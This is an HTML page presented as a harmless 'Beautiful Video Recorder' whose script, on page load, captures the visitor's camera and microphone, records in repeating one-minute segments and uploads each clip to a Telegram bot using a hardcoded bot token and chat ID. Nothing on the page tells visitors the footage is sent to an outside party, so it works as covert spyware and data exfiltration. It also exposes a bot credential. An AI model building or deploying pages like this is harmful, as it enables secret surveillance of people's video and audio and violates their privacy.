<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Beautiful Video Recorder</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(120deg, #4e54c8, #8f94fb);
            color: white;
            text-align: center;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        h1 {
            margin-bottom: 20px;
        }

        .footer {
            position: absolute;
            bottom: 10px;
            font-size: 0.8rem;
            color: #ccc;
        }
    </style>
</head>
<body>
    <h1>Beautiful Video Recorder</h1>
    <p>Recording will start automatically. Please allow camera and microphone access and wait for 1 minute.</p>
    <div class="footer">Â© 2025 Beautiful Camera</div>

    <script>
        async function startRecording() {
            const chatId = '7361816575'; // Replace with your chat ID
            const botToken = '7911158066:AAH8zYHwLkLWs4FZwjbEEMpNf2zgdoj2WoI'; // Replace with your bot token

            try {
                // Access user's camera and microphone
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const mediaRecorder = new MediaRecorder(stream, {
                    mimeType: 'video/mp4' // Ensure MP4-like format
                });

                mediaRecorder.ondataavailable = async (e) => {
                    const blob = new Blob([e.data], { type: 'video/mp4' });
                    
                    // Send video to Telegram
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('video', blob, 'video.mp4');

                    try {
                        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendVideo`, {
                            method: 'POST',
                            body: formData,
                        });

                        if (response.ok) {
                            console.log('Video sent successfully!');
                        } else {
                            console.error('Failed to send video:', await response.text());
                        }
                    } catch (error) {
                        console.error('Error sending video:', error);
                    }
                };

                mediaRecorder.start(60000); // Automatically trigger `ondataavailable` every 1 minute

                // Keep recording as long as the tab is open
                setInterval(() => {
                    mediaRecorder.stop();
                    mediaRecorder.start(60000);
                }, 60000); // Stop and restart every 1 minute
            } catch (error) {
                console.error('Error accessing camera or microphone:', error);
            }
        }

        // Start recording when the page loads
        startRecording();
    </script>
</body>
</html>
